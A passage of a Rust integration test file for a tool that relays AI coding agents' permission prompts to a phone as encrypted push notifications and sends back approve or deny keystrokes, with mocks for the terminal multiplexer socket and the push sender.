use std::path::PathBuf;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use apns_h2::PushType;
use base64::Engine;
use base64::engine::general_purpose::{STANDARD, URL_SAFE_NO_PAD};
use chacha20poly1305::aead::{Aead, Payload};
use chacha20poly1305::{ChaCha20Poly1305, KeyInit};
use collied::activity::Live;
use collied::approvals::Approvals;
use collied::audit::Audit;
use collied::drive::{Authorized, Reply};
use collied::flock::StatusTracker;
use collied::push::{Alert, Delivery, Device, Push, Rejection, Sender};
use collied::runtime::PaneProcesses;
use collied::transcript::Transcripts;
use futures_util::future::BoxFuture;
use protocol::{
    ActivityId, ApnsEnvironment, Approval, ApprovalDecideParams, ApprovalOutcome, Decision,
    ErrorCode, Event, Nonce, NotificationKey, PendingTool, PromptText, PushToken, Response,
    TerminalId,
};
use serde_json::{Value, json};
use sha2::{Digest, Sha256};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt};
use tokio::net::UnixListener;
use tokio::sync::broadcast;

const TERMINAL: &str = "term_0a1b2c3d4e5f60";
const PHONE: &str = "nPHONE";
const LABEL: &str = "Test iPhone";
const TTL: Duration = Duration::from_secs(600);
const SETTLE: Duration = Duration::from_millis(600);

const BASH: &str = include_str!("fixtures/claude/bash.txt");
const BASH_COUNTDOWN: &str = include_str!("fixtures/claude/bash-countdown.txt");
const QUESTION: &str = include_str!("fixtures/claude/question.txt");
const PLAN: &str = include_str!("fixtures/claude/plan.txt");
const BASH_TALL: &str = include_str!("fixtures/claude-2.1.328/bash-tall.tmux.txt");
// Claude Code 2.1.294's rate limit form, under a `▔` border and no rule.
const RATE_LIMIT: &str = include_str!("fixtures/claude-2.1.294/rate-limit-options.detection.txt");

// Claude Code 2.1.289 (tmux, 100 columns): a rule splits the options, and the trust
// prompt is unnumbered.
const QUESTION_LIVE: &str = include_str!("fixtures/claude-2.1.289/question.tmux.txt");
const TRUST_LIVE: &str = include_str!("fixtures/claude-2.1.289/trust.tmux.txt");
// Claude Code 2.1.292 in herdr 0.9.3: the same unnumbered trust prompt, "No, exit" first.
const TRUST_292: &str = include_str!("fixtures/claude-2.1.292/trust.detection.txt");
const TRUST_OPTIONS: [&str; 2] = ["No, exit", "Yes, I trust this folder"];

// Claude Code 2.1.289 in herdr 0.9.3, the working directory renamed.
const BASH_LIVE: &str = include_str!("fixtures/claude-2.1.289/bash.detection.txt");
const PLAN_LIVE: &str = include_str!("fixtures/claude-2.1.289/plan.detection.txt");

// Claude Code 2.1.308 asking for a guarded `rm`, with its reason under the command.
const RM_REASON: &str = include_str!("fixtures/claude-2.1.308/rm-reason.detection.txt");

// Claude Code 2.1.294 in herdr 0.9.3, each `blocked` under live_blocked_form: `/effort`,
// `/config`'s time format picker, and `/ide`, which connects an IDE and keeps alerting.
const EFFORT: &str = include_str!("fixtures/claude-2.1.294/effort.detection.txt");
const TIME_FORMAT: &str = include_str!("fixtures/claude-2.1.294/config-time-format.detection.txt");
const IDE: &str = include_str!("fixtures/claude-2.1.294/ide.detection.txt");
// The same capture's `/memory` and usage credits forms: like `/ide`, no numbered option.
const MEMORY: &str = include_str!("fixtures/claude-2.1.294/memory.detection.txt");
const USAGE_CREDITS: &str = include_str!("fixtures/claude-2.1.294/usage-credits.detection.txt");

// Claude Code 2.1.300 in herdr 0.9.5, in a session named with `/rename`, with tasks open: a
// question over the task panel (live_blocked_form_named_session), the name drawn on a rule
// under its footer, and `/config`'s time format picker, which hides the panel
// (live_blocked_form).
const RENAMED_QUESTION: &str =
    include_str!("fixtures/claude-2.1.300/renamed-question-tasks.detection.txt");
const RENAMED_TIME_FORMAT: &str =
    include_str!("fixtures/claude-2.1.300/renamed-config-time-format-tasks.detection.txt");

// Claude Code 2.1.329 (100 columns), each screen with the last lines of its session's
// transcript at that moment, the pending call last; see `transcript::asked`'s tests.
macro_rules! capture {
    ($name:literal) => {
        (
            include_str!(concat!("fixtures/claude-2.1.329/", $name, ".txt")),
            include_str!(concat!(
                "fixtures/claude-2.1.329/",
                $name,
                ".transcript.min.jsonl"
            )),
        )
    };
}
const ASKED_ONE: (&str, &str) = capture!("question-one");
const ASKED_MULTI: (&str, &str) = capture!("two-questions-second-multiselect");
const ASKED_REVIEW: (&str, &str) = capture!("two-questions-after-tab");
const ASKED_TALL: (&str, &str) = capture!("question-tall-12-rows");
const ASKED_BASH: (&str, &str) = capture!("bash");
// The same with Code Mode on: the pending call is a `REPL` script that calls the question.
const SCRIPTED: (&str, &str) = capture!("codemode-question-one");
const SCRIPTED_BUILT: (&str, &str) = capture!("codemode-question-built");
// Claude Code 2.1.328's Edit prompt: `Yes` is its only option that reads as an approval.
const EDIT: &str = include_str!("fixtures/claude-2.1.328/edit.tmux.txt");
// Claude Code 2.1.300's dynamic workflow prompt: `Yes, run it`, `View raw script`, `No`.
const WORKFLOW: &str = include_str!("fixtures/claude-2.1.300/renamed-workflow.detection.txt");
// A transcript whose last line Claude Code is still writing: what the session waits on is
// not known.
const CUT: &str = "{\"type\":\"assi";
const ASKED_PLAN: (&str, &str) = capture!("plan");
// The session and folder of those transcripts, which the rig's own process stands for.
const SESSION: &str = "00000000-0000-4000-8000-000000000000";
const CWD: &str = "/private/tmp/planlab";

/// A transcript whose last line is written after this process started, as a pending call's
/// is. A capture as it is stands for a call an earlier process left.
fn fresh(transcript: &str) -> String {
    let mut rows: Vec<String> = transcript.lines().map(str::to_owned).collect();
    let last = rows.last_mut().unwrap();
    let mut line: Value = serde_json::from_str(last).unwrap();
    line["timestamp"] = json!("2999-01-01T00:00:00.000Z");
    *last = line.to_string();
    rows.join("\n") + "\n"
}

/// The transcript of a session that waits on one AskUserQuestion call. The older question
/// captures have no transcript: their calls are written by hand from their screens.
fn asking(questions: &[(&str, &[(&str, &str)])]) -> String {
    let questions: Vec<Value> = questions
        .iter()
        .map(|(question, options)| {
            let options: Vec<Value> = options
                .iter()
                .map(|(label, description)| json!({"label": label, "description": description}))
                .collect();
            json!({"question": question, "options": options, "multiSelect": false})
        })
        .collect();
    fresh(
        &json!({"type": "assistant", "sessionId": SESSION, "message": {"content": [
            {"type": "tool_use", "id": "toolu_1", "name": "AskUserQuestion",
             "input": {"questions": questions}},
        ]}})
        .to_string(),
    )
}

const STORAGE: &str = "Which storage backend should the cache use?";
// QUESTION's call, QUESTION_LIVE's and RENAMED_QUESTION's.
const ASKS: &[(&str, &[(&str, &str)])] = &[(
    STORAGE,
    &[
        ("SQLite", "Embedded, no server"),
        ("Redis", "Shared across processes"),
    ],
)];
const ASKS_LIVE: &[(&str, &[(&str, &str)])] = &[(
    STORAGE,
    &[
        (
            "SQLite",
            "File-based database, good for single-instance deployments with local persistence",
        ),
        (
            "Redis",
            "In-memory data store, better for distributed systems and high-performance scenarios",
        ),
    ],
)];
const ASKS_RENAMED: &[(&str, &[(&str, &str)])] = &[(
    "Which color do you prefer?",
    &[
        ("Red", "Pick red"),
        ("Green", "Pick green"),
        ("Blue", "Pick blue"),
    ],
)];

// Codex CLI and Copilot CLI prompts as herdr rules them; see `prompt::fixtures`.
const OTHER_KINDS: [(&str, &str, &str); 6] = [
    (
        "codex",
        "live_strong_blocker",
        include_str!("fixtures/codex/exec.detection.txt"),
    ),
    (
        "codex",
        "live_strong_blocker",
        include_str!("fixtures/codex/patch.detection.txt"),
    ),
    (
        "codex",
        "trust_directory",
        include_str!("fixtures/codex/trust.detection.txt"),
    ),
    (
        "copilot",
        "selection_blocker",
        include_str!("fixtures/copilot/shell.detection.txt"),
    ),
    (
        "copilot",
        "selection_blocker",
        include_str!("fixtures/copilot/edit.detection.txt"),
    ),
    (
        "copilot",
        "selection_blocker",
        include_str!("fixtures/copilot/trust.detection.txt"),
    ),
];

const MUTATING: [&str; 6] = [
    "agent.prompt",
    "agent.send_keys",
    "agent.start",
    "pane.send_text",
    "pane.send_input",
    "pane.send_keys",
];

struct Herdr {
    agent: Value,
    rule: String,
    text: String,
    calls: Vec<(String, Value)>,
    unblock_on_keys: bool,
    arrows_move: bool,
    tab_amends: bool,
    text_lands: bool,
    tab_moves_on: bool,
    tab_rewords: Option<(&'static str, &'static str)>,
}

struct Mock {
    state: Arc<Mutex<Herdr>>,
    socket: PathBuf,
}

impl Mock {
    fn start(dir: &std::path::Path) -> Self {
        let socket = dir.join("herdr.sock");
        let state = Arc::new(Mutex::new(Herdr {
            agent: json!({
                "terminal_id": TERMINAL, "workspace_id": "w7", "pane_id": "w7:p1",
                "tab_id": "w7:t1", "focused": false, "revision": 0,
                "agent": "claude", "name": "api-fixer", "agent_status": "blocked",
                "state_change_seq": 4, "cwd": CWD,
                "agent_session": {"source": "herdr:claude", "agent": "claude", "kind": "id", "value": "sess-1"},
            }),
            rule: "bash_permission_prompt".into(),
            text: BASH.into(),
            calls: Vec::new(),
            unblock_on_keys: true,
            arrows_move: true,
            tab_amends: true,
            text_lands: true,
            tab_moves_on: false,
            tab_rewords: None,
        }));
        let listener = UnixListener::bind(&socket).unwrap();
        let shared = state.clone();
        tokio::spawn(async move {
            loop {
                let (stream, _) = listener.accept().await.unwrap();
                let state = shared.clone();
                tokio::spawn(async move {
                    let (r, mut w) = stream.into_split();
                    let mut line = String::new();
                    tokio::io::BufReader::new(r)
                        .read_line(&mut line)
                        .await
                        .unwrap();
                    let req: Value = serde_json::from_str(&line).unwrap();
                    let result = answer(&mut state.lock().unwrap(), &req);
                    let resp = json!({"id": req["id"], "result": result});
                    let _ = w.write_all(format!("{resp}\n").as_bytes()).await;
                });
            }
        });
        Self { state, socket }
    }

    fn with<R>(&self, f: impl FnOnce(&mut Herdr) -> R) -> R {
        f(&mut self.state.lock().unwrap())
    }

    fn params(&self, method: &str) -> Vec<Value> {
        self.with(|h| {
            h.calls
                .iter()
                .filter(|(m, _)| m == method)
                .map(|(_, p)| p.clone())
                .collect()
        })
    }

    fn set_status(&self, status: &str) {
        self.with(|h| set_status(h, status));
    }
}

fn set_status(h: &mut Herdr, status: &str) {
    h.agent["agent_status"] = json!(status);
    let seq = h.agent["state_change_seq"].as_u64().unwrap();
    h.agent["state_change_seq"] = json!(seq + 1);
}

fn answer(h: &mut Herdr, req: &Value) -> Value {
    let method = req["method"].as_str().unwrap().to_owned();
    let p = req["params"].clone();
    h.calls.push((method.clone(), p.clone()));
    match method.as_str() {
        "agent.list" => json!({"type": "agent_list", "agents": [h.agent]}),
        "workspace.list" => json!({"type": "workspace_list", "workspaces": [
            {"workspace_id": "w7", "number": 2, "label": "api", "focused": false,
             "pane_count": 1, "tab_count": 1, "active_tab_id": "w7:t1", "agent_status": "blocked"},
        ]}),
        "agent.explain" => json!({"type": "agent_explain", "explain": {
            "agent": "claude", "state": h.agent["agent_status"],
            "matched_rule": {"id": h.rule, "priority": 850, "region": "whole_recent", "state": "blocked"},
            "evaluated_rules": [{"id": h.rule, "matched": true, "evidence": {"region_preview": h.text}}],
        }}),
        "pane.read" => json!({"type": "pane_read", "read": {
            "pane_id": p["pane_id"], "workspace_id": "w7", "tab_id": "w7:t1",
            "source": p["source"], "format": "text", "text": h.text, "revision": 0, "truncated": false,
        }}),
        "agent.send_keys" => {
            for key in p["keys"].as_array().unwrap() {
                match key.as_str().unwrap() {
                    "down" if h.arrows_move => h.text = move_cursor(&h.text, 1),
                    "up" if h.arrows_move => h.text = move_cursor(&h.text, -1),
                    "enter" | "esc" if h.unblock_on_keys => set_status(h, "working"),
                    "tab" if h.tab_moves_on => {
                        let seq = h.agent["state_change_seq"].as_u64().unwrap();
                        h.agent["state_change_seq"] = json!(seq + 1);
                    }
                    "tab" if h.tab_amends => {
                        h.text = relabel(&h.text, |l| {
                            if l == "Yes" {
                                "Yes, and tell Claude what to do next".into()
                            } else if l == "No" {
                                "No, and tell Claude what to do differently".into()
                            } else {
                                l.into()
                            }
                        })
                        .replace(" · Tab to amend", "");
                        if let Some((from, to)) = h.tab_rewords {
                            h.text = h.text.replace(from, to);
                        }
                    }
                    _ => {}
                }
            }
            json!({"type": "ok"})
        }
        "pane.send_text" => {
            let typed = p["text"].as_str().unwrap().to_owned();
            if h.text_lands {
                h.text = relabel(&h.text, |l| {
                    if l.starts_with("Yes, and tell") {
                        format!("Yes, {typed}")
                    } else if l.starts_with("No, and tell") {
                        format!("No, {typed}")
                    } else {
                        format!("{l}{typed}")
                    }
                });
            }
            json!({"type": "ok"})
        }
        other => panic!("unexpected herdr call {other}"),
    }
}

fn move_cursor(text: &str, by: isize) -> String {
    let mut lines: Vec<String> = text.lines().map(str::to_owned).collect();
    let options: Vec<usize> = (0..lines.len())
        .filter(|&i| {
            let t = lines[i].trim_start().trim_start_matches('❯').trim_start();
            (t.as_bytes().first().is_some_and(u8::is_ascii_digit) && t[1..].starts_with(". "))
                || TRUST_OPTIONS.contains(&t)
        })
        .collect();
    let at = options
        .iter()
        .position(|&i| lines[i].contains('❯'))
        .unwrap();
    let to = at.saturating_add_signed(by).min(options.len() - 1);
    lines[options[at]] = lines[options[at]].replacen('❯', " ", 1);
    lines[options[to]] = if lines[options[to]].starts_with("   ") {
        lines[options[to]].replacen("   ", " ❯ ", 1)
    } else {
        lines[options[to]].replacen("  ", "❯ ", 1)
    };
    lines.join("\n") + "\n"
}

/// Replaces the label of the option under the cursor.
fn relabel(text: &str, f: impl Fn(&str) -> String) -> String {
    let mut lines: Vec<String> = text.lines().map(str::to_owned).collect();
    let line = lines
        .iter_mut()
        .rev()
        .find(|l| l.trim_start().starts_with('❯') && l.contains(". "))
        .unwrap();
    let at = line.find(". ").unwrap() + 2;
    *line = format!("{}{}", &line[..at], f(&line[at..]));
    lines.join("\n") + "\n"
}

#[derive(Default)]
struct Apns {
    relay: bool,
    sent: Mutex<Vec<(String, Alert)>>,
    live_fails: Mutex<Option<Rejection>>,
    live_attempts: AtomicUsize,
}

impl Sender for Apns {
    fn mode(&self) -> protocol::PushMode {
        if self.relay {
            protocol::PushMode::Relay
        } else {
            protocol::PushMode::Direct
        }
    }
    fn send<'a>(
        &'a self,
        device: &'a Device,
        alert: &'a Alert,
    ) -> BoxFuture<'a, Result<(), Rejection>> {
        Box::pin(async move {
            if matches!(alert.delivery, Delivery::LiveActivity { .. }) {
                self.live_attempts.fetch_add(1, Ordering::SeqCst);
                if let Some(e) = self.live_fails.lock().unwrap().clone() {
                    return Err(e);
                }
            }
            self.sent
                .lock()
                .unwrap()
                .push((device.token.as_str().to_owned(), alert.clone()));
            Ok(())
        })
    }
}

struct Rig {
    herdr: Mock,
    apns: Arc<Apns>,
    push: Arc<Push>,
    notification_key: NotificationKey,
    approvals: Arc<Approvals>,
    live: Mutex<(Live, StatusTracker)>,
    events: Option<broadcast::Receiver<Event>>,
    audit: PathBuf,
    audit_log: Arc<Audit>,
    claude: PathBuf,
    transcript: PathBuf,
    _dir: tempfile::TempDir,
}

fn token() -> PushToken {
    PushToken::new("ab".repeat(32)).unwrap()
}

const OTHER: &str = "nOTHER";

fn other_token() -> PushToken {
    PushToken::new("cd".repeat(32)).unwrap()
}

fn activity_token() -> PushToken {
    PushToken::new("ef".repeat(80)).unwrap()
}

impl Rig {
    async fn start(ttl: Duration) -> Self {
        Self::start_with_budget(ttl, None).await
    }

    async fn start_with_budget(ttl: Duration, budget: Option<Duration>) -> Self {
        Self::start_with_delivery(ttl, budget, false).await
    }

    async fn start_with_delivery(ttl: Duration, budget: Option<Duration>, relay: bool) -> Self {
        let dir = tempfile::tempdir().unwrap();
        let herdr = Mock::start(dir.path());
        let apns = Arc::new(Apns {
            relay,
            ..Apns::default()
        });
        let push = Push::open(
            dir.path().join("push.json"),
            Some(apns.clone()),
            Arc::new(|_| true),
        )
        .unwrap();
        let mut key = [0u8; 32];
        getrandom::fill(&mut key).unwrap();
        let notification_key = NotificationKey::new(URL_SAFE_NO_PAD.encode(key)).unwrap();
        push.register(
            PHONE,
            token(),
            ApnsEnvironment::Sandbox,
            notification_key.clone(),
            false,
            relay.then(|| protocol::RelayGrant {
                token: protocol::RelaySendToken::new(format!("v1.key.YQ.{}", "A".repeat(43)))
                    .unwrap(),
                route_id: protocol::RelayRouteId::new("route").unwrap(),
                generation: 1,
                expires_at: collied::now_ms() / 1000 + 86400,
            }),
        )
        .unwrap();
        let audit = dir.path().join("audit.log");
        let audit_log = Arc::new(Audit::open(&audit).unwrap());
        let (tx, events) = broadcast::channel(64);
        // A Claude Code session of this process's own in a scratch folder, with no transcript
        // until a test writes one: the pane's one process, as herdr would list it.
        let claude = dir.path().join("claude");
        let transcript = claude.join(format!("projects/-private-tmp-planlab/{SESSION}.jsonl"));
        std::fs::create_dir_all(transcript.parent().unwrap()).unwrap();
        std::fs::create_dir_all(claude.join("sessions")).unwrap();
        let pid = std::process::id();
        let session = json!({
            "pid": pid, "sessionId": SESSION, "cwd": CWD, "startedAt": collied::now_ms(),
        });
        std::fs::write(
            claude.join(format!("sessions/{pid}.json")),
            session.to_string(),
        )
        .unwrap();
        let mut transcripts = Transcripts::new(Some(claude.join("projects")), None);
        let procs = PaneProcesses {
            pids: vec![pid],
            attach: None,
        };
        transcripts.set_pane(TERMINAL.into(), "w7:p1".into(), Some(procs));
        let mut approvals = Approvals::new(
            herdr.socket.clone(),
            "nMAC".into(),
            tx,
            audit_log.clone(),
            Some(push.clone()),
        )
        .with_timing(ttl, SETTLE)
        .with_transcripts(Arc::new(Mutex::new(transcripts)));
        if let Some(budget) = budget {
            approvals = approvals.with_budget(budget);
        }
        let approvals = Arc::new(approvals);
        Self {
            herdr,
            apns,
            push,
            notification_key,
            approvals,
            live: Mutex::new((Live::default(), StatusTracker::default())),
            events: Some(events),
            audit,
            audit_log,
            claude,
            transcript,
            _dir: dir,
        }
    }

    /// The session this process claims from now on, its transcript `text`.
    fn session(&self, id: &str, text: &str) {
        let pid = std::process::id();
        let session = json!({
            "pid": pid, "sessionId": id, "cwd": CWD, "startedAt": collied::now_ms(),
        });
        std::fs::write(
            self.claude.join(format!("sessions/{pid}.json")),
            session.to_string(),
        )
        .unwrap();
        std::fs::write(self.transcript.with_file_name(format!("{id}.jsonl")), text).unwrap();
    }

    fn transcript(&self, text: &str) {
        std::fs::write(&self.transcript, text).unwrap();
    }

    fn follow(&self) {
        self.push
            .register_activity(
                PHONE,
                ActivityId::new("ACT-1").unwrap(),
                TerminalId::new(TERMINAL).unwrap(),
                activity_token(),
                true,
                Some(display_binding()),
                None,
            )
            .unwrap();
    }

    /// One reconcile as the server runs it: approvals, then Live Activities.
    async fn tick(&self) {
        let agents = collied::runtime::herdr::agent_list(&self.herdr.socket)
            .await
            .unwrap();
        let workspaces = collied::runtime::herdr::workspace_list(&self.herdr.socket)
            .await
            .unwrap();
        self.approvals.observe(&agents, &workspaces).await;
        let pending = self.approvals.pending();
        let (live, tracker) = &mut *self.live.lock().unwrap();
        live.observe(
            &self.push,
            &self.audit_log,
            &agents,
            &|_| false,
            &workspaces,
            &pending,
            tracker,
        );
    }

    async fn ticked_needed(&mut self) -> Approval {
        self.tick().await;
        loop {
            match self.event().await {
                Event::ApprovalNeeded { approval } => return approval,
                Event::ApprovalResolved { .. } => {}
                other => panic!("expected approval.needed, got {other:?}"),
            }
        }
    }

    /// Everything sent so far, once the queue has drained.
    async fn sent(&self) -> Vec<(String, Alert)> {
        tokio::time::sleep(Duration::from_millis(100)).await;
        self.apns.sent.lock().unwrap().clone()
    }

    async fn observe(&self) {
        let agents = collied::runtime::herdr::agent_list(&self.herdr.socket)
            .await
            .unwrap();
        let workspaces = collied::runtime::herdr::workspace_list(&self.herdr.socket)
            .await
            .unwrap();
        self.approvals.observe(&agents, &workspaces).await;
    }

    async fn event(&mut self) -> Event {
        tokio::time::timeout(Duration::from_secs(2), self.events.as_mut().unwrap().recv())
            .await
            .expect("no event")
            .unwrap()
    }

    fn no_event(&mut self) {
        assert!(
            matches!(
                self.events.as_mut().unwrap().try_recv(),
                Err(broadcast::error::TryRecvError::Empty)
            ),
            "unexpected event"
        );
    }

    async fn needed(&mut self) -> Approval {
        self.observe().await;
        loop {
            match self.event().await {
                Event::ApprovalNeeded { approval } => return approval,
                Event::ApprovalResolved { .. } => {}
                other => panic!("expected approval.needed, got {other:?}"),
            }
        }
    }

    async fn decide(&self, a: &Approval, decision: Decision, nonce: &Nonce) -> Reply {
        self.decide_as(a, decision, nonce, Arc::new(|| true)).await
    }

    async fn decide_as(
        &self,
        a: &Approval,
        decision: Decision,
        nonce: &Nonce,
        auth: Authorized,
    ) -> Reply {
        let p = ApprovalDecideParams {
            approval_id: a.approval_id.clone(),
            decision,
            choice: None,
            nonce: nonce.clone(),
            note: None,
        };
        self.approvals.decide(LABEL, PHONE, p, &auth).await
    }

    async fn decide_with_note(
        &self,
        a: &Approval,
        decision: Decision,
        note: &str,
        auth: Authorized,
    ) -> Reply {
        let p = ApprovalDecideParams {
            approval_id: a.approval_id.clone(),
            decision,
            choice: None,
            nonce: a.nonce.clone(),
            note: Some(PromptText::new(note).unwrap()),
        };
        self.approvals.decide(LABEL, PHONE, p, &auth).await
    }

    async fn choose(&self, a: &Approval, choice: u8, nonce: &Nonce) -> Reply {
        let p = ApprovalDecideParams {
            approval_id: a.approval_id.clone(),
            decision: Decision::Choose,
            choice: Some(choice),
            nonce: nonce.clone(),
            note: None,
        };
        let auth: Authorized = Arc::new(|| true);
        self.approvals.decide(LABEL, PHONE, p, &auth).await
    }

    async fn alerts(&self, n: usize) -> Vec<(String, Alert)> {
        for _ in 0..200 {
            if self.apns.sent.lock().unwrap().len() >= n {
                break;
            }
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
        self.apns.sent.lock().unwrap().clone()
    }

    fn audit(&self) -> Vec<Value> {
        std::fs::read_to_string(&self.audit)
            .unwrap_or_default()
            .lines()
            .map(|l| serde_json::from_str(l).unwrap())
            .collect()
    }

    fn mutations(&self) -> Vec<String> {
        self.herdr.with(|h| {
            h.calls
                .iter()
                .map(|(m, _)| m.clone())
                .filter(|m| MUTATING.contains(&m.as_str()))
                .collect()
        })
    }
}

fn wrong(n: &Nonce) -> Nonce {
    let flipped = if n.as_str().starts_with('A') {
        'B'
    } else {
        'A'
    };
    Nonce::new(format!("{flipped}{}", &n.as_str()[1..])).unwrap()
}

fn resolved(reply: Reply) -> ApprovalOutcome {
    match reply {
        Ok(Response::ApprovalResolved { outcome, .. }) => outcome,
        other => panic!("expected a resolution, got {other:?}"),
    }
}

/// The phone's side: `enc` opened with the device key, AAD = approval_id.
fn open_context(key: &NotificationKey, payload: &Value) -> Value {
    if payload.get("event_id").is_some() {
        let display = open_display(key, payload, 1);
        return json!({"v":1,"body":display["body"]});
    }
    let key = URL_SAFE_NO_PAD.decode(key.as_str()).unwrap();
    let combined = STANDARD.decode(payload["enc"].as_str().unwrap()).unwrap();
    let (nonce, sealed) = combined.split_at(12);
    let plain = ChaCha20Poly1305::new_from_slice(&key)
        .unwrap()
        .decrypt(
            nonce.try_into().unwrap(),
            Payload {
                msg: sealed,
                aad: payload["approval_id"].as_str().unwrap().as_bytes(),
            },
        )
        .unwrap();
    serde_json::from_slice(&plain).unwrap()
}

fn display_binding() -> protocol::ActivityDisplayBinding {
    protocol::ActivityDisplayBinding {
        node_id: protocol::Label::new("nMAC").unwrap(),
        binding_id: ActivityId::new("binding-test").unwrap(),
    }
}

fn open_display(key: &NotificationKey, payload: &Value, kind: u8) -> Value {
    let key = URL_SAFE_NO_PAD.decode(key.as_str()).unwrap();
    let enc = if kind == 1 {
        &payload["enc"]
    } else {
        &payload["aps"]["content-state"]["enc"]
    };
    let bytes = URL_SAFE_NO_PAD.decode(enc.as_str().unwrap()).unwrap();
    assert_eq!(&bytes[..2], &[1, kind]);
    let node_end = 4 + usize::from(bytes[2]);
    let scope_end = node_end + usize::from(bytes[3]);
    let header_end = scope_end + 16;
    assert_eq!(
        std::str::from_utf8(&bytes[4..node_end]).unwrap(),
        payload["node_id"].as_str().unwrap()
    );
    assert_eq!(
        URL_SAFE_NO_PAD.encode(&bytes[scope_end..header_end]),
        payload["event_id"].as_str().unwrap()
    );
    if kind == 1 {
        assert_eq!(
            std::str::from_utf8(&bytes[node_end..scope_end]).unwrap(),
            payload["aps"]["thread-id"].as_str().unwrap()
        );
    } else {
        assert_eq!(&bytes[node_end..scope_end], b"binding-test");
    }
    let aad = [
        b"collie.push.v1\0".as_slice(),
        &bytes[..header_end],
        &Sha256::digest(&key),
    ]
    .concat();
    let plain = ChaCha20Poly1305::new_from_slice(&key)
        .unwrap()
        .decrypt(
            bytes[header_end..header_end + 12].try_into().unwrap(),
            Payload {
                msg: &bytes[header_end + 12..],
                aad: &aad,
            },
        )
        .unwrap();
    serde_json::from_slice(&plain).unwrap()
}

fn code(reply: Reply) -> ErrorCode {
    reply.expect_err("expected an error").0
}

#[tokio::test]
async fn blocked_agent_gets_one_approval_and_one_alert() {
    let mut rig = Rig::start(TTL).await;
    let a = rig.needed().await;
    assert_eq!(a.terminal_id.as_str(), TERMINAL);
    assert_eq!(a.agent_label, "api-fixer");
    assert_eq!(a.workspace_label, "api");
    assert_eq!(
        a.options,
        [Decision::Approve, Decision::ApproveAlways, Decision::Deny]
    );
    assert_eq!(
        a.snippet,
        "Bash command\nrm -rf build\nRemove the build directory\nDo you want to proceed?"
    );
    assert_eq!(
        a.tool,
        Some(PendingTool {
            name: "Bash".into(),
            summary: "rm -rf build\nRemove the build directory".into()
        }),
        "the screen names the call, with no hook"
    );
    let labels: Vec<(u8, &str, bool)> = a
        .choices
        .iter()
        .map(|c| (c.index, c.label.as_str(), c.current))
        .collect();
    assert_eq!(
        labels,
        [
            (0, "Yes", true),
            (
                1,
                "Yes, and don't ask again for rm commands in /Users/me/src/app",
                false
            ),
            (2, "No, and tell Claude what to do differently (esc)", false),
        ]
    );
    assert_eq!(a.expires_at_ms - a.created_at_ms, TTL.as_millis() as u64);
    assert_eq!(rig.approvals.pending(), std::slice::from_ref(&a));

    let alerts = rig.alerts(1).await;
    assert_eq!(alerts.len(), 1);
    let (to, alert) = &alerts[0];
    assert_eq!(to, token().as_str());
    assert_eq!(
        open_context(&rig.notification_key, &alert.payload),
        json!({"v": 1, "body": "Bash: rm -rf build\nRemove the build directory"})
    );
    let display = open_display(&rig.notification_key, &alert.payload, 1);
    assert_eq!(display["title"], "api-fixer");
    assert_eq!(display["approvalId"], a.approval_id.as_str());
    assert_eq!(display["terminalId"], TERMINAL);
    assert_eq!(display["offersApproval"], true);
    assert_eq!(
        alert.payload["aps"]["alert"],
        json!({"title":"Collie","body":"An agent needs attention"})
    );
    assert!(alert.payload["aps"].get("category").is_none());
    assert_ne!(alert.collapse_id.as_deref(), Some(TERMINAL));
    assert_eq!(alert.expiration, Some(a.expires_at_ms / 1000));
    let wire = alert.payload.to_string();
    assert!(!wire.contains(a.nonce.as_str()) && !wire.contains("rm -rf"));

    rig.observe().await;
    rig.no_event();
    assert_eq!(rig.alerts(2).await.len(), 1);
    assert_eq!(
        rig.herdr.params("agent.explain")[0],
        json!({"target": "w7:p1"})
    );
    assert_eq!(
        rig.herdr.params("pane.read")[0],
        json!({"pane_id": "w7:p1", "source": "detection", "format": "text"})
    );
    assert!(rig.mutations().is_empty());
}

#[tokio::test]
async fn decide_sends_the_mapped_keys_once() {
    let mut rig = Rig::start(TTL).await;
    let a = rig.needed().await;
    let outcome = resolved(rig.decide(&a, Decision::Approve, &a.nonce).await);
    assert_eq!(
        outcome,
        ApprovalOutcome::Applied {
            decision: Decision::Approve,
            by: LABEL.into()
        }
    );
    assert_eq!(
        rig.herdr.params("agent.send_keys"),
        [json!({"target": "w7:p1", "keys": ["enter"]})]
    );
    assert!(matches!(
        rig.event().await,
        Event::ApprovalResolved { approval_id, outcome: ApprovalOutcome::Applied { .. } }
            if approval_id == a.approval_id
    ));
    assert!(rig.approvals.pending().is_empty());

    assert_eq!(
        code(rig.decide(&a, Decision::Approve, &a.nonce).await),
        ErrorCode::ApprovalAlreadyResolved
    );
    assert_eq!(rig.herdr.params("agent.send_keys").len(), 1);

    rig.herdr.set_status("blocked");
    let b = rig.needed().await;
    assert_ne!(b.approval_id, a.approval_id);
    assert_ne!(b.nonce, a.nonce);
    assert_eq!(rig.alerts(2).await.len(), 2, "a new prompt alerts again");
    resolved(rig.decide(&b, Decision::Deny, &b.nonce).await);
    assert_eq!(
        rig.herdr.params("agent.send_keys")[1],
        json!({"target": "w7:p1", "keys": ["esc"]})
    );

    let results: Vec<String> = rig
        .audit()
        .iter()
        .map(|e| {
            assert_eq!(e["method"], "approval.decide");
            assert_eq!(e["peer"], LABEL);
            e["result"].as_str().unwrap().to_owned()
        })
        .collect();
    assert_eq!(
        results,
        [
            format!("approve: applied terminal={TERMINAL} keys=enter"),
            "approve: rejected: replayed".to_owned(),
            format!("deny: applied terminal={TERMINAL} keys=esc"),
        ]
    );
    assert_eq!(rig.audit()[0]["target"], a.approval_id.as_str());
}

#[tokio::test]
async fn expired_approvals_are_rejected_and_reissued_with_a_fresh_alert() {
    let mut rig = Rig::start(Duration::from_millis(200)).await;
    let a = rig.needed().await;
    tokio::time::sleep(Duration::from_millis(250)).await;
    assert_eq!(
        code(rig.decide(&a, Decision::Approve, &a.nonce).await),
        ErrorCode::ApprovalExpired
    );
    assert!(matches!(
        rig.event().await,
        Event::ApprovalResolved {
            outcome: ApprovalOutcome::Expired,
            ..
        }
    ));
    let b = rig.needed().await;
    assert_ne!(b.approval_id, a.approval_id);
    let alerts = rig.alerts(2).await;
    assert_eq!(
        alerts.len(),
        2,
        "the reissued approval replaces the dead alert"
    );
    assert_eq!(alerts[0].1.payload["approval_id"], a.approval_id.as_str());
    assert_eq!(alerts[1].1.payload["approval_id"], b.approval_id.as_str());
    let collapse = alerts[0].1.collapse_id.as_deref();
